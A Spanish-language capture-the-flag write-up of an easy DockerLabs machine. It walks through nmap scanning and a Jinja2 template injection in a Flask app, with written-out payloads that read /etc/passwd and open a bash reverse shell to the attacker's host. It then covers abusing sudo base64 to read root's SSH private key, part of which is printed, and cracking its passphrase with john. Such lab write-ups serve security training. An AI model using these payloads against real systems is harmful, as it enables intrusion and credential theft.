Propiedades:
- OS: Linux
- Plataforma: DockerLabs
- Nivel: Easy
- Tags: #ssti #jinja2 #ssh-key-cracking #password-cracking

![](assets/Pasted%20image%2020251110164053.png)

## Reconocimiento

Comienzo tirando un ping para comprobar la conectividad.

```bash
> ping -c1 172.17.0.2
PING 172.17.0.2 (172.17.0.2) 56(84) bytes of data.
64 bytes from 172.17.0.2: icmp_seq=1 ttl=64 time=0.224 ms

--- 172.17.0.2 ping statistics ---
1 packets transmitted, 1 received, 0% packet loss, time 0ms
rtt min/avg/max/mdev = 0.224/0.224/0.224/0.000 ms
```

- El TTL de 64 indica que estamos ante una máquina Linux.

Ahora tiro un escaneo con nmap para ver que puertos tenemos abiertos.

```bash
> nmap -p- -sS --open -Pn -n --min-rate 5000 172.17.0.2
------------------------------------------------------------
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
8089/tcp open  unknown
MAC Address: 06:72:90:D3:81:3F (Unknown)
```

- Puertos 22, 80 y 8089 abiertos.

Sobre los puertos abiertos realizo un segundo escaneo más profundo para detectar servicios, versiones y correr un conjunto de scripts de reconocimiento.

```bash
> nmap -p 22,80,8089 -sCV -Pn -n -sS --min-rate 5000 -vvv 172.17.0.2 -oN target.txt
---------------------------------------------------------------------------------------
PORT     STATE SERVICE REASON         VERSION
22/tcp   open  ssh     syn-ack ttl 64 OpenSSH 9.2p1 Debian 2+deb12u2 (protocol 2.0)
| ssh-hostkey: 
|   256 dc:98:72:d5:05:7e:7a:c0:14:df:29:a1:0e:3d:05:ba (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBKZZ30gHh3MJnOlBFsClzY4+XLHLM3yZHnYGk0bNxNPPQtaojCxlQAjpM4uWPkVKLWDJQ53wQ/HIeaaqsE7n8Fs=
|   256 39:42:28:c9:c8:fa:05:de:89:e6:37:62:4d:8b:f3:63 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIHgwRMztrUMxAvJeiwbmls3FFWnEj11lPMbqFIDUorc2
80/tcp   open  http    syn-ack ttl 64 Apache httpd 2.4.59 ((Debian))
| http-methods: 
|_  Supported Methods: GET POST OPTIONS HEAD
|_http-title: Apache2 Debian Default Page: It works
|_http-server-header: Apache/2.4.59 (Debian)
8089/tcp open  unknown syn-ack ttl 64
```

Tenemos la siguiente informacion:

- Puerto 22 SSH OpenSSH 9.2p1 Debian 2+deb12u2
- Puerto 80 HTTP Apache httpd 2.4.59
- Puerto 8089: Servicio desconocido

## Enumeración

### Puerto 80 HTTP

La página principal muestra la página por defecto de Apache2 sin contenido relevante.

### Puerto 8089

Al acceder al puerto 8089 desde el navegador encuentro una aplicación web. 

Utilizo `whatweb` para identificar las tecnologías.

- La aplicación corre con **Python 3.11.2** y **Werkzeug 2.2.2** (framework Flask).


```bash
> whatweb http://172.17.0.2:8089/
http://172.17.0.2:8089/ [200 OK] Country[RESERVED][ZZ], HTTPServer[Werkzeug/2.2.2 Python/3.11.2], IP[172.17.0.2], Python[3.11.2], Title[Dale duro bro], Werkzeug[2.2.2]
```

La aplicacion tiene solo un input:

![](assets/Pasted%20image%2020251110165559.png)

Probando la aplicación noto que el input del usuario se refleja en la página. El parámetro `?user=` también se refleja en la pagina.

![](assets/Pasted%20image%2020251110165824.png)

Sabiendo que la aplicación corre en Python y que el input del usuario se refleja dinámicamente, sospecho que podría estar utilizando un motor de plantillas como **Jinja2**, lo cual podría ser vulnerable a **SSTI (Server-Side Template Injection)**.

## Explotación

### Server-Side Template Injection (SSTI)

Para probar el SSTI pruebo con una operación matemática simple para confirmar si la aplicación interpreta expresiones de plantilla.

En el input coloco:

```
{{7*7}}
```

![](assets/Pasted%20image%2020251110170230.png)

- La aplicación evalúa la expresión y devuelve `49`, confirmando la vulnerabilidad SSTI.

### Lectura de Archivos con SSTI

Ahora que se que la web es vulnerable a SSTI puedo buscar payloads para Jinja2 que me permitan leer archivos del sistema. 

- Voy a utilizar el siguiente payload para leer el `/etc/passwd`:

```python
> {{ get_flashed_messages.__globals__.__builtins__.open("/etc/passwd").read() }}
```

![](assets/Pasted%20image%2020251110170620.png)

- El `/etc/passwd` muestra que existe un usuario llamado `verde`

### Reverse Shell mediante SSTI

SSTI tambien me va a permitr ejecutar comandos, por lo cual voy a buscar algun payload.

- Voy a utilizar este payload para entablarme una reverse-shell.

```bash
> {{ self.__init__.__globals__.__builtins__.__import__('subprocess').Popen('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"', shell=True) }}
```

![](assets/Pasted%20image%2020251110171843.png)

Primero me tengo quee poner en escucha en mi máquina atacante.

```bash
> sudo nc -nlvp 443
listening on [any] 443 ...
```

y ahora puedo ejecutar el payload en la web para tener conexion:

```bash
Connection received on 172.17.0.2 45678
verde@d56c80ae05a3:~$ whoami
verde
verde@d56c80ae05a3:~$ id
uid=1000(verde) gid=1000(verde) groups=1000(verde)
```

## Escalada de Privilegios

Dentro del sistema enumero binarios que pueda ejecutar con privilegios elevados.

```bash
verde@d56c80ae05a3:~$ sudo -l
User verde may run the following commands on d56c80ae05a3:
    (root) NOPASSWD: /usr/bin/base64
```

- Puedo ejecutar `base64` como root sin contraseña.

### Lectura de Clave SSH de Root

Durante el reconocimiento descubrimos que el puerto 22 (SSH) está abierto por lo cual es posible que el usuario root tenga una clave SSH privada. 

- Puedo tratar de leer esta clave abusando del binario `base64` para codificarla y descodificarla:

```bash
> sudo /usr/bin/base64 /root/.ssh/id_rsa | base64 -d
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAACmFlczI1Ni1jdHIAAAAGYmNyeXB0AAAAGAAAABAHul0xZQ
r68d1eRBMAoL1IAAAAEAAAAAEAAAIXAAAAB3NzaC1yc2EAAAADAQABAAACAQDbTQGZZWBB
VRdf31TPoa0wcuFMcqXJhxfX9HqhmcePAyZMxtgChQzYmmzRgkYH6jBTXSnNanTe4A0KME
...
```

Ahora voy a guardar la clave en mi sistema y ajustar los permisos para poder usarla.

```bash
> chmod 600 root-key
> ssh -i root-key root@172.17.0.2
Enter passphrase for key 'root-key':
```

- Al tratar de usar la clave me pide contraseña

### Cracking de la Contraseña SSH

Puedo crackear la contraseña utilizando `ssh2john` para extraer el hash crackeable y crackaer dicho hash con `john`: 

```bash
> ssh2john root-key > hash
> sudo john --wordlist=/usr/share/wordlists/rockyou.txt hash
> sudo john --show hash
root-key:honda1
```

![](assets/Pasted%20image%2020251110175319.png)

- Contraseña encontrada: `honda1`

Ahora si puedo conectarme por SSH con la clave privada y la contraseña.

```bash
> ssh -i root-key root@172.17.0.2
Enter passphrase for key 'root-key': honda1
root@d56c80ae05a3:~# whoami
root
root@d56c80ae05a3:~# id
uid=0(root) gid=0(root) groups=0(root)
```

![](assets/Pasted%20image%2020251110175431.png)

***PWNED***